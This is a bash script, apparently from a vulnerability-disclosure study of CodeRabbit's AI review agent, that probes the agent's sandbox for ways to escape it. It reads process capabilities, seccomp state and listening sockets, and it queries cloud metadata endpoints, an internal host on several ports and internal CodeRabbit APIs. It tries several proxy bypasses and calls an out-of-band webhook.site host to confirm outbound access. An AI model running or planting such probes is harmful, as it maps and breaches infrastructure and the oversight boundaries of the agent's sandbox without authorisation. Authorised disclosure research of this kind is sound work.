#!/usr/bin/env bash
# jailbatt_jail_battery.sh — benign read-only network release diagnostic (CodeRabbit VDP research, lane JAILBATT).
# Recipe R-EGRESSMX-1 (probe set identical to 04_analysis/egressmx_jail_battery.sh; lane delta =
# jailbatt_ marker + 1s pacing between probes for the lane's <=1 rps HTTP cap; request COUNT unchanged).
# READ-ONLY: status codes / error classes only. No response bodies from metadata or internal
# targets are ever printed (HTTP200_BODY_WITHHELD rule). Secret values are never printed.
set +e
OAST="https://webhook.site/cdeb4418-2174-4bd9-9545-7cc53fb796fc"
echo "JAILBATT_JAIL_START"
echo "LANE_MARKER: jailbatt_"
echo "TS_UTC: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "HEAD_SHA: $(git rev-parse HEAD 2>/dev/null || echo no-git)"
echo "SCRIPT_SHA256: $( (sha256sum "$0" 2>/dev/null || shasum -a 256 "$0") | awk '{print $1}')"

echo "== IDENTITY (pool discrimination) =="
id
echo "UNAME: $(uname -a)"
echo "PWD: $(pwd)"
grep -E '^(Cap|Seccomp|NoNewPrivs)' /proc/self/status
echo "uid_map: $(head -1 /proc/self/uid_map 2>/dev/null)"
echo "cgroup: $(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' ' ')"
grep -m1 ' / ' /proc/self/mountinfo 2>/dev/null | sed -E 's/(upperdir|workdir)=[^ ]*/\1=<RUNPATH>/g'

echo "== EGRESS ENV (topology) =="
env | grep -iE '^(http_proxy|https_proxy|all_proxy|no_proxy|HTTP_PROXY|HTTPS_PROXY|ALL_PROXY|NO_PROXY)=' \
  | sed -E 's#(://[^:/@]{4})[^@/]*@#\1<REDACTED>@#'
echo "CURLVER: $(curl --version 2>/dev/null | head -1)"

echo "== LISTENING SOCKETS (sidecar presence) =="
for f in /proc/net/tcp /proc/net/tcp6; do
  [ -r "$f" ] || continue
  while read -r lh st rest; do
    [ "$st" = "0A" ] || continue
    hex=${lh##*:}
    printf 'LISTEN_%s_%d\n' "$(basename $f)" "$((16#$hex))"
  done < <(awk 'NR>1 {print $2, $4}' "$f")
done

echo "== ROUTE TABLE =="
cat /proc/net/route 2>/dev/null

# probe() — run the given command with curl output flags appended: code, rc, time,
# error class verbatim, selected headers. Body preview ONLY on error-class replies (<=400B).
probe() {
  local label="$1"; shift
  local out code tt rc err sz
  out=$("$@" -sS -m 10 -o /tmp/_emx_b -D /tmp/_emx_h -w '%{http_code} %{time_total}' 2>/tmp/_emx_e); rc=$?
  code=$(echo "$out" | awk '{print $1}'); tt=$(echo "$out" | awk '{print $2}')
  err=$(head -c 160 /tmp/_emx_e 2>/dev/null | tr '\n' ' ')
  echo "$label -> code=${code:-000} rc=$rc T=${tt:-0} err=[$err]"
  grep -iE '^(Via|Age|X-Cache|X-Proxy|Proxy-Auth|Server|Content-Length|Content-Type|Location)' /tmp/_emx_h 2>/dev/null \
    | head -4 | sed 's/^/    hdr /'
  sz=$(wc -c < /tmp/_emx_b 2>/dev/null | tr -d ' ')
  case "$code" in
    2*) if [ "${sz:-0}" -gt 0 ]; then echo "    HTTP200_BODY_WITHHELD (len=${sz}B)"; fi ;;
    *)  if [ "${sz:-0}" -gt 0 ] && [ "${sz:-0}" -le 400 ]; then
          echo "    body(${sz}B): $(head -c 120 /tmp/_emx_b | tr '\n' ' ' | sed -E 's#(://[^:/@]{4})[^@/]*@#\1<REDACTED>@#')"
        fi ;;
  esac
  sleep 1
}

echo "== A. DEFAULT PATH (environment proxy policy) =="
probe "A1_imds_gcp"    curl -H 'Metadata-Flavor: Google' "http://169.254.169.254/computeMetadata/v1/instance/"
probe "A2_imds_aws"    curl "http://169.254.169.254/latest/meta-data/"
probe "A3_mgi"         curl -H 'Metadata-Flavor: Google' "http://metadata.google.internal/computeMetadata/v1/"
probe "A4_i28"         curl "http://10.0.0.28/"
probe "A5_oast_ctrl"   curl "$OAST?leg=jailbatt_default"
probe "A6_wake_root"   curl "http://api.agent.coderabbit.ai/"
probe "A7_wake_health" curl "https://api.agent.coderabbit.ai/api/internal/health"
probe "A8_github"      curl "https://api.github.com/"

echo "== A9. INTERNAL HOST PORT MATRIX (10.0.0.28) =="
for p in 22 80 443 1080; do
  if timeout 4 bash -c "exec 3<>/dev/tcp/10.0.0.28/$p" 2>/dev/null; then echo "TCP_${p}_OPEN"; else echo "TCP_${p}_NO"; fi
  sleep 1
done

echo "== B. CLIENT-SIDE PROXY BYPASS --noproxy '*' (direct dial) =="
probe "B1_imds_gcp"  curl --noproxy '*' -H 'Metadata-Flavor: Google' "http://169.254.169.254/computeMetadata/v1/instance/"
probe "B2_imds_aws"  curl --noproxy '*' "http://169.254.169.254/latest/meta-data/"
probe "B3_mgi"       curl --noproxy '*' -H 'Metadata-Flavor: Google' "http://metadata.google.internal/computeMetadata/v1/"
probe "B4_i28"       curl --noproxy '*' "http://10.0.0.28/"
probe "B5_oast_ctrl" curl --noproxy '*' "$OAST?leg=jailbatt_noproxy"
if getent hosts metadata.google.internal >/dev/null 2>&1; then echo "B6_getent_mgi: RESOLVES (ip withheld)"; else echo "B6_getent_mgi: GETENT_MGI_FAIL"; fi

echo "== C. PROXY-ENV UNSET (env -u) =="
probe "C1_imds" env -u http_proxy -u https_proxy -u all_proxy -u no_proxy -u NO_PROXY -u HTTP_PROXY -u HTTPS_PROXY curl "http://169.254.169.254/computeMetadata/v1/instance/"
probe "C2_i28"  env -u http_proxy -u https_proxy -u all_proxy -u no_proxy -u NO_PROXY -u HTTP_PROXY -u HTTPS_PROXY curl "http://10.0.0.28/"
probe "C3_oast" env -u http_proxy -u https_proxy -u all_proxy -u no_proxy -u NO_PROXY -u HTTP_PROXY -u HTTPS_PROXY curl "$OAST?leg=jailbatt_envunset"

echo "== D. SIDECAR-FORCED (--noproxy '' -x http://127.0.0.1:1080) =="
probe "D1_sidecar_i28"     curl --noproxy '' -x http://127.0.0.1:1080 "http://10.0.0.28/"
probe "D2_sidecar_imds"    curl --noproxy '' -x http://127.0.0.1:1080 -H 'Metadata-Flavor: Google' "http://169.254.169.254/computeMetadata/v1/instance/"
probe "D3_sidecar_connect" curl --noproxy '' -x http://127.0.0.1:1080 "$OAST?leg=jailbatt_sidecar_connect"
probe "D4_sidecar_wake"    curl --noproxy '' -x http://127.0.0.1:1080 "https://api.agent.coderabbit.ai/api/internal/health"
echo "D_note: D3 hdr/body above shows whether the sidecar CONNECT-forwards attacker-chosen public HTTPS"

echo "JAILBATT_JAIL_END"
